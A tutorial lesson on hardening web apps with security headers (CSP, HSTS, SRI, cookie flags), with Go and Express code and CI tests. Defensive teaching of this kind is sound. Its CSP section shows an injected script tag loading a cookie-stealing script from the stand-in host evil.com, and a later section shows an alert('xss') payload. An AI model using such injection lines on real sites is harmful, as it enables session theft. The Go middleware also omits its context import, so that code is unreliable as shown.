# Lesson 20: Security Headers and Hardening

Your application code might be bulletproof. Parameterized queries everywhere,
proper auth on every endpoint, input validation on every field. But if your
HTTP responses do not include the right headers, the browser will happily
help attackers bypass all of it. Security headers are instructions you send
to the browser that say "here are the rules for interacting with my site."
Without them, the browser assumes anything goes.

---

## The Analogy

Security headers are like rules posted at the entrance of a building:

- **"No cameras allowed"** — Permissions-Policy disabling camera access
- **"All visitors must sign in at the front desk"** — Strict-Transport-Security forcing HTTPS
- **"No piggyback entry — one badge swipe per person"** — X-Frame-Options preventing clickjacking
- **"Only employees may enter through the side door"** — Content-Security-Policy restricting script sources
- **"Do not remove anything from the building without a signed form"** — Referrer-Policy controlling data leakage

The building itself (your code) might be secure. But without rules posted at
every entrance, people will do things you never intended.

---

## Content-Security-Policy (CSP)

CSP is the most powerful browser security header. It tells the browser
exactly where it is allowed to load resources from — scripts, styles, images,
fonts, connections, everything. If an attacker injects a `<script>` tag
pointing to their server, CSP blocks it because that domain was not on the
allowlist.

### How XSS Wins Without CSP

Without CSP, an attacker who finds an XSS vulnerability can:

```html
<script src="https://evil.com/steal-cookies.js"></script>
```

The browser happily loads and executes it. There is no rule saying it
should not.

### CSP Directives

| Directive | Controls | Example |
|---|---|---|
| `default-src` | Fallback for all resource types | `'self'` |
| `script-src` | JavaScript sources | `'self' 'nonce-abc123'` |
| `style-src` | CSS sources | `'self' 'unsafe-inline'` |
| `img-src` | Image sources | `'self' data: https://cdn.example.com` |
| `connect-src` | XHR, fetch, WebSocket targets | `'self' https://api.example.com` |
| `font-src` | Web font sources | `'self' https://fonts.gstatic.com` |
| `frame-src` | Iframe sources | `'none'` |
| `frame-ancestors` | Who can embed your page | `'none'` |
| `object-src` | Plugin sources (Flash, Java) | `'none'` |
| `base-uri` | Restricts `<base>` tag | `'self'` |
| `form-action` | Where forms can submit | `'self'` |
| `report-uri` | Where to send violation reports | `/csp-report` |

### Building a CSP From Scratch

Start strict, loosen only when needed. Never start permissive.

**Step 1 — Block everything:**

```
Content-Security-Policy: default-src 'none'
```

This breaks your entire site. Good. Now you know exactly what to allow.

**Step 2 — Allow your own origin:**

```
Content-Security-Policy: default-src 'self'
```

Now your own scripts, styles, and images load. Third-party resources are
still blocked.

**Step 3 — Add specific sources:**

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-a1b2c3d4';
  style-src 'self' https://fonts.googleapis.com;
  font-src 'self' https://fonts.gstatic.com;
  img-src 'self' data: https://images.example.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
```

**Step 4 — Use nonces for inline scripts:**

Instead of allowing `'unsafe-inline'` (which defeats the purpose of CSP),
generate a random nonce on every request:

```html
<script nonce="a1b2c3d4">
  // This script runs because its nonce matches the CSP header
  initApp();
</script>
```

An attacker's injected script has no nonce, so the browser blocks it.

### Report-Only Mode

Deploy CSP in report-only mode first to see what would break without
actually breaking it:

```
Content-Security-Policy-Report-Only:
  default-src 'self';
  report-uri /csp-report;
```

The browser logs violations but does not block anything. Review the reports,
fix your code, then switch to enforcement mode.

---

## Strict-Transport-Security (HSTS)

HSTS tells the browser: "Never communicate with this site over plain HTTP.
Always use HTTPS. Even if the user types `http://`, upgrade to `https://`
automatically."

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

- `max-age=31536000` — Remember this rule for one year (in seconds)
- `includeSubDomains` — Apply to all subdomains too
- `preload` — Submit to browser preload list (baked into Chrome, Firefox, etc.)

### Why HSTS Matters

Without HSTS, an attacker on a coffee shop WiFi can do an SSL stripping
attack:

```
User types: http://bank.com
                ↓
Attacker intercepts the redirect to https://
                ↓
Attacker proxies: User ←HTTP→ Attacker ←HTTPS→ bank.com
                ↓
User thinks they are on HTTPS but attacker sees everything
```

With HSTS, the browser never makes the HTTP request in the first place. It
upgrades to HTTPS before the request leaves the machine.

### Real-World Breach: SSL Stripping

In 2009, Moxie Marlinspike demonstrated sslstrip at Black Hat. He sat on a
Tor exit node and stripped HTTPS from every connection passing through. Users
logged into banking sites, email, social media — all in plaintext. HSTS was
designed specifically to counter this attack.

### The Preload List

The HSTS preload list is a list of domains hardcoded into the browser itself.
Even on the very first visit, the browser uses HTTPS. Submit your domain at
`hstspreload.org` after you have confirmed HTTPS works on all subdomains.

---

## X-Content-Type-Options

```
X-Content-Type-Options: nosniff
```

One header, one value. It tells the browser: "Do not try to guess the content
type. If I say this file is `text/plain`, do not execute it as JavaScript
just because it looks like JavaScript."

Without this header, an attacker can upload a file named `profile.jpg` that
actually contains JavaScript. The browser might MIME-sniff it, decide it is
JavaScript, and execute it. With `nosniff`, the browser respects the declared
Content-Type and refuses to execute it.

---

## X-Frame-Options / CSP frame-ancestors

These headers prevent clickjacking — where an attacker embeds your site in
an invisible iframe and tricks users into clicking things they cannot see.

```
X-Frame-Options: DENY
```

Or using CSP (preferred, more flexible):

```
Content-Security-Policy: frame-ancestors 'none'
```

### Clickjacking Attack

```
Attacker's page (visible):        Your site (invisible iframe):
┌────────────────────────┐        ┌────────────────────────┐
│                        │        │                        │
│  "Click here to win    │        │  [Delete Account]      │  ← positioned
│   a free iPhone!"      │        │                        │     exactly under
│                        │        │                        │     the "win" button
│   [ CLAIM PRIZE ]      │        │                        │
│                        │        │                        │
└────────────────────────┘        └────────────────────────┘
```

The user clicks "CLAIM PRIZE" but actually clicks "Delete Account" on your
site loaded in a transparent iframe. Frame-ancestors prevents your site from
being embedded at all.

---

## Referrer-Policy

When a user clicks a link from your site to another site, the browser sends
a `Referer` header with the URL they came from. This can leak sensitive data:

```
Referer: https://yoursite.com/patient/12345/medical-records
```

Referrer-Policy controls how much information leaks:

| Value | What Gets Sent |
|---|---|
| `no-referrer` | Nothing |
| `origin` | Just the domain (`https://yoursite.com`) |
| `same-origin` | Full URL for same-origin, nothing for cross-origin |
| `strict-origin` | Domain for HTTPS→HTTPS, nothing for HTTPS→HTTP |
| `strict-origin-when-cross-origin` | Full URL same-origin, domain cross-origin |
| `no-referrer-when-downgrade` | Full URL for HTTPS→HTTPS, nothing for HTTPS→HTTP |

**Recommended:** `strict-origin-when-cross-origin` for most sites. Use
`no-referrer` if your URLs contain sensitive data.

```
Referrer-Policy: strict-origin-when-cross-origin
```

---

## Permissions-Policy

Permissions-Policy (formerly Feature-Policy) lets you disable browser
features your site does not use. If your site never needs camera access,
disable it — so even XSS cannot enable it.

```
Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
```

Each directive takes a list of allowed origins. Empty `()` means disabled for
everyone, including your own site.

| Feature | What It Controls |
|---|---|
| `camera` | Access to camera |
| `microphone` | Access to microphone |
| `geolocation` | GPS location |
| `payment` | Payment Request API |
| `usb` | USB device access |
| `autoplay` | Media autoplay |
| `fullscreen` | Fullscreen API |
| `display-capture` | Screen capture |

If you ever do need a feature, allow only your own origin:

```
Permissions-Policy: geolocation=(self)
```

---

## Subresource Integrity (SRI)

When you load a script from a CDN, you trust that CDN to serve the correct
file. If the CDN is compromised, they can serve malicious JavaScript to every
site that uses them.

SRI lets you pin a hash of the expected file. The browser downloads the
script, computes its hash, and only executes it if the hash matches:

```html
<script
  src="https://cdn.example.com/library-3.2.1.min.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8w"
  crossorigin="anonymous"
></script>
```

If the CDN serves a modified file, the hash will not match and the browser
refuses to execute it.

### Generating SRI Hashes

```bash
# Generate hash for a local file
cat library.js | openssl dgst -sha384 -binary | openssl base64 -A

# Or use curl for a remote file
curl -s https://cdn.example.com/library.js | openssl dgst -sha384 -binary | openssl base64 -A
```

### Real-World Attack: British Airways (2018)

Attackers compromised a third-party script loaded on British Airways' payment
page. The modified script captured credit card details from 380,000
customers. SRI would have prevented the modified script from executing
because the hash would not match.

---

## Cookie Security Flags

Cookies need their own security configuration. Without proper flags, cookies
are vulnerable to theft and misuse:

| Flag | Purpose | Example |
|---|---|---|
| `Secure` | Only send over HTTPS | Prevents cookie theft on HTTP |
| `HttpOnly` | No JavaScript access | Prevents XSS from reading cookies |
| `SameSite=Strict` | Only send on same-site requests | Prevents CSRF |
| `SameSite=Lax` | Send on top-level navigations | Balance of security and usability |
| `Path=/` | Scope to a path | Limits which pages receive the cookie |
| `Max-Age=3600` | Expire after N seconds | Limits exposure window |

**Best practice for session cookies:**

```
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600
```

- `Secure` — never transmitted over HTTP
- `HttpOnly` — JavaScript cannot read it (XSS cannot steal it)
- `SameSite=Lax` — protects against CSRF while allowing normal navigation
- `Path=/` — available site-wide
- `Max-Age=3600` — expires in one hour

---

## Implementing Security Headers in Go

```go
package middleware

import (
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"net/http"
)

func generateNonce() (string, error) {
	nonceBytes := make([]byte, 16)
	_, err := rand.Read(nonceBytes)
	if err != nil {
		return "", fmt.Errorf("generate nonce: %w", err)
	}
	return base64.StdEncoding.EncodeToString(nonceBytes), nil
}

type nonceKey struct{}

func SecurityHeaders(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		nonce, err := generateNonce()
		if err != nil {
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}

		csp := fmt.Sprintf(
			"default-src 'self'; "+
				"script-src 'self' 'nonce-%s'; "+
				"style-src 'self' https://fonts.googleapis.com; "+
				"font-src 'self' https://fonts.gstatic.com; "+
				"img-src 'self' data:; "+
				"connect-src 'self'; "+
				"frame-ancestors 'none'; "+
				"object-src 'none'; "+
				"base-uri 'self'; "+
				"form-action 'self'",
			nonce,
		)

		w.Header().Set("Content-Security-Policy", csp)
		w.Header().Set("Strict-Transport-Security", "max-age=31536000; includeSubDomains; preload")
		w.Header().Set("X-Content-Type-Options", "nosniff")
		w.Header().Set("X-Frame-Options", "DENY")
		w.Header().Set("Referrer-Policy", "strict-origin-when-cross-origin")
		w.Header().Set("Permissions-Policy", "camera=(), microphone=(), geolocation=(), payment=()")
		w.Header().Del("X-Powered-By")
		w.Header().Del("Server")

		r = r.WithContext(
			contextWithNonce(r.Context(), nonce),
		)

		next.ServeHTTP(w, r)
	})
}

func contextWithNonce(ctx context.Context, nonce string) context.Context {
	return context.WithValue(ctx, nonceKey{}, nonce)
}

func NonceFromContext(ctx context.Context) string {
	nonce, ok := ctx.Value(nonceKey{}).(string)
	if !ok {
		return ""
	}
	return nonce
}

func SecureCookie(name, value string, maxAge int) *http.Cookie {
	return &http.Cookie{
		Name:     name,
		Value:    value,
		Path:     "/",
		MaxAge:   maxAge,
		HttpOnly: true,
		Secure:   true,
		SameSite: http.SameSiteLaxMode,
	}
}

func SetSessionCookie(w http.ResponseWriter, sessionID string) {
	http.SetCookie(w, SecureCookie("session", sessionID, 3600))
}

func ClearSessionCookie(w http.ResponseWriter) {
	http.SetCookie(w, SecureCookie("session", "", -1))
}
```

Using the middleware with a standard Go HTTP server:

```go
package main

import (
	"context"
	"fmt"
	"net/http"
)

func main() {
	mux := http.NewServeMux()

	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		nonce := NonceFromContext(r.Context())
		w.Header().Set("Content-Type", "text/html")
		fmt.Fprintf(w, `<!DOCTYPE html>
<html>
<head><title>Secure App</title></head>
<body>
  <h1>Hello, secure world</h1>
  <script nonce="%s">
    console.log("This script runs because it has the correct nonce");
  </script>
</body>
</html>`, nonce)
	})

	server := &http.Server{
		Addr:    ":8080",
		Handler: SecurityHeaders(mux),
	}
	server.ListenAndServe()
}
```

---

## Implementing Security Headers in TypeScript (Express + Helmet)

Helmet is the standard library for security headers in Express. But you should
understand what it does, not just install it blindly.

```typescript
import express, { Request, Response, NextFunction } from "express";
import crypto from "crypto";

const app = express();

function generateNonce(): string {
  return crypto.randomBytes(16).toString("base64");
}

declare global {
  namespace Express {
    interface Locals {
      cspNonce: string;
    }
  }
}

function securityHeaders(req: Request, res: Response, next: NextFunction): void {
  const nonce = generateNonce();
  res.locals.cspNonce = nonce;

  const csp = [
    "default-src 'self'",
    `script-src 'self' 'nonce-${nonce}'`,
    "style-src 'self' https://fonts.googleapis.com",
    "font-src 'self' https://fonts.gstatic.com",
    "img-src 'self' data:",
    "connect-src 'self'",
    "frame-ancestors 'none'",
    "object-src 'none'",
    "base-uri 'self'",
    "form-action 'self'",
  ].join("; ");

  res.setHeader("Content-Security-Policy", csp);
  res.setHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains; preload");
  res.setHeader("X-Content-Type-Options", "nosniff");
  res.setHeader("X-Frame-Options", "DENY");
  res.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");
  res.setHeader("Permissions-Policy", "camera=(), microphone=(), geolocation=(), payment=()");
  res.removeHeader("X-Powered-By");

  next();
}

app.use(securityHeaders);

app.get("/", (req: Request, res: Response) => {
  const nonce = res.locals.cspNonce;
  res.send(`<!DOCTYPE html>
<html>
<head><title>Secure App</title></head>
<body>
  <h1>Hello, secure world</h1>
  <script nonce="${nonce}">
    console.log("This script runs because it has the correct nonce");
  </script>
</body>
</html>`);
});

app.listen(8080);
```

### Using Helmet (the production shortcut)

```typescript
import helmet from "helmet";
import express from "express";
import crypto from "crypto";

const app = express();

app.use((req, res, next) => {
  res.locals.cspNonce = crypto.randomBytes(16).toString("base64");
  next();
});

app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", (req, res) => `'nonce-${(res as any).locals.cspNonce}'`],
        styleSrc: ["'self'", "https://fonts.googleapis.com"],
        fontSrc: ["'self'", "https://fonts.gstatic.com"],
        imgSrc: ["'self'", "data:"],
        connectSrc: ["'self'"],
        frameAncestors: ["'none'"],
        objectSrc: ["'none'"],
        baseUri: ["'self'"],
        formAction: ["'self'"],
      },
    },
    strictTransportSecurity: {
      maxAge: 31536000,
      includeSubDomains: true,
      preload: true,
    },
    referrerPolicy: {
      policy: "strict-origin-when-cross-origin",
    },
    permissionsPolicy: {
      camera: [],
      microphone: [],
      geolocation: [],
      payment: [],
    },
  })
);
```

---

## Testing Your Headers

### Using curl

```bash
curl -I https://yoursite.com
```

Check for:

```
strict-transport-security: max-age=31536000; includeSubDomains; preload
content-security-policy: default-src 'self'; script-src 'self' 'nonce-...'
x-content-type-options: nosniff
x-frame-options: DENY
referrer-policy: strict-origin-when-cross-origin
permissions-policy: camera=(), microphone=(), geolocation=(), payment=()
```

And check these are ABSENT:

```
x-powered-by    (reveals framework — Express, Rails, etc.)
server          (reveals web server version — nginx/1.19.0)
```

### Using securityheaders.com

Navigate to `securityheaders.com` and enter your URL. It grades your headers
from A+ to F. Aim for A+. If you implement everything in this lesson, you
will get it.

### Automated Testing in CI

```go
package headers_test

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

func TestSecurityHeaders(t *testing.T) {
	handler := SecurityHeaders(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))

	req := httptest.NewRequest(http.MethodGet, "/", nil)
	rec := httptest.NewRecorder()
	handler.ServeHTTP(rec, req)

	tests := []struct {
		header   string
		contains string
	}{
		{"Content-Security-Policy", "default-src 'self'"},
		{"Content-Security-Policy", "frame-ancestors 'none'"},
		{"Content-Security-Policy", "object-src 'none'"},
		{"Strict-Transport-Security", "max-age=31536000"},
		{"Strict-Transport-Security", "includeSubDomains"},
		{"X-Content-Type-Options", "nosniff"},
		{"X-Frame-Options", "DENY"},
		{"Referrer-Policy", "strict-origin-when-cross-origin"},
		{"Permissions-Policy", "camera=()"},
	}

	for _, tt := range tests {
		value := rec.Header().Get(tt.header)
		if value == "" {
			t.Errorf("missing header: %s", tt.header)
			continue
		}
		if !strings.Contains(value, tt.contains) {
			t.Errorf("header %s = %q, want to contain %q", tt.header, value, tt.contains)
		}
	}

	if rec.Header().Get("X-Powered-By") != "" {
		t.Error("X-Powered-By header should be removed")
	}
}

func TestCSPNonceIsUnique(t *testing.T) {
	handler := SecurityHeaders(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))

	nonces := make(map[string]bool)
	for i := 0; i < 100; i++ {
		req := httptest.NewRequest(http.MethodGet, "/", nil)
		rec := httptest.NewRecorder()
		handler.ServeHTTP(rec, req)

		csp := rec.Header().Get("Content-Security-Policy")
		start := strings.Index(csp, "nonce-") + 6
		end := strings.Index(csp[start:], "'") + start
		nonce := csp[start:end]

		if nonces[nonce] {
			t.Fatalf("duplicate nonce detected on request %d: %s", i, nonce)
		}
		nonces[nonce] = true
	}
}
```

```typescript
import { describe, it, expect } from "vitest";
import request from "supertest";
import express from "express";

function createTestApp(): express.Express {
  const app = express();
  app.use(securityHeaders);
  app.get("/", (req, res) => res.send("ok"));
  return app;
}

describe("security headers", () => {
  const app = createTestApp();

  it("sets Content-Security-Policy", async () => {
    const res = await request(app).get("/");
    expect(res.headers["content-security-policy"]).toContain("default-src 'self'");
    expect(res.headers["content-security-policy"]).toContain("frame-ancestors 'none'");
    expect(res.headers["content-security-policy"]).toContain("object-src 'none'");
  });

  it("sets HSTS", async () => {
    const res = await request(app).get("/");
    expect(res.headers["strict-transport-security"]).toContain("max-age=31536000");
    expect(res.headers["strict-transport-security"]).toContain("includeSubDomains");
  });

  it("sets X-Content-Type-Options", async () => {
    const res = await request(app).get("/");
    expect(res.headers["x-content-type-options"]).toBe("nosniff");
  });

  it("sets X-Frame-Options", async () => {
    const res = await request(app).get("/");
    expect(res.headers["x-frame-options"]).toBe("DENY");
  });

  it("removes X-Powered-By", async () => {
    const res = await request(app).get("/");
    expect(res.headers["x-powered-by"]).toBeUndefined();
  });

  it("generates unique nonces per request", async () => {
    const nonces = new Set<string>();
    for (let i = 0; i < 50; i++) {
      const res = await request(app).get("/");
      const csp = res.headers["content-security-policy"];
      const match = csp.match(/nonce-([A-Za-z0-9+/=]+)/);
      expect(match).not.toBeNull();
      nonces.add(match![1]);
    }
    expect(nonces.size).toBe(50);
  });
});
```

---

## Common Mistakes

### 1. Using `unsafe-inline` in CSP

```
Content-Security-Policy: script-src 'self' 'unsafe-inline'
```

This defeats the entire purpose of CSP. If inline scripts are allowed, an
attacker's injected `<script>alert('xss')</script>` runs freely. Use nonces
instead.

### 2. Wildcard CSP

```
Content-Security-Policy: default-src *
```

This allows loading resources from anywhere. It is the same as having no CSP.

### 3. HSTS Without Testing HTTPS First

If you enable HSTS before your entire site (including all subdomains) works
over HTTPS, you lock users out. Test HTTPS thoroughly before adding the
`preload` directive. The HSTS preload list is very difficult to undo.

### 4. Forgetting API Endpoints

Security headers are often set only on HTML-serving routes. Your API endpoints
need them too — especially `X-Content-Type-Options`, CORS headers, and
`Strict-Transport-Security`.

### 5. Missing SameSite on Cookies

Without `SameSite`, cookies are sent on cross-origin requests by default.
This enables CSRF attacks. Always set `SameSite=Lax` at minimum.

---

## The Complete Header Checklist

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; ...
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
```

Remove:

```
X-Powered-By (any value)
Server (or set to a generic value)
```

Cookies:

```
Set-Cookie: name=value; Secure; HttpOnly; SameSite=Lax; Path=/
```

---

## Exercises

1. **Audit your current project.** Run `curl -I` against your deployed
   application and list every missing security header. Add them all.

2. **Build a CSP from scratch** for a React application that uses Google
   Fonts, communicates with your API on a different subdomain, and loads
   images from an S3 bucket. Start with `default-src 'none'` and add only
   what is needed.

3. **Test with securityheaders.com.** Deploy your headers and scan your site.
   Fix issues until you reach an A+ grade.

4. **Write a clickjacking proof of concept.** Create an HTML page that embeds
   your site in an iframe. Verify that `frame-ancestors 'none'` blocks it.

5. **Implement SRI** for every CDN-loaded script in a project. Generate the
   hashes and verify that modifying the script content causes the browser to
   reject it.

6. **Set up CSP reporting.** Configure `report-uri` to send violation reports
   to your logging system. Deploy in report-only mode for a week and analyze
   what would break in enforcement mode.

---

## Key Takeaways

- Security headers are free defense. They cost nothing to implement and block
  entire categories of attacks.
- CSP is the most important header. Build it from `default-src 'none'` and
  use nonces for inline scripts. Never use `unsafe-inline`.
- HSTS prevents SSL stripping attacks. Enable it with `preload` after
  verifying HTTPS works on all subdomains.
- SRI protects against compromised CDNs. Pin hashes on every third-party
  script.
- Cookie flags (`Secure`, `HttpOnly`, `SameSite`) are mandatory for session
  cookies. There is no valid reason to omit them.
- Test your headers in CI. Security headers that silently disappear during
  a refactor leave you exposed without anyone noticing.
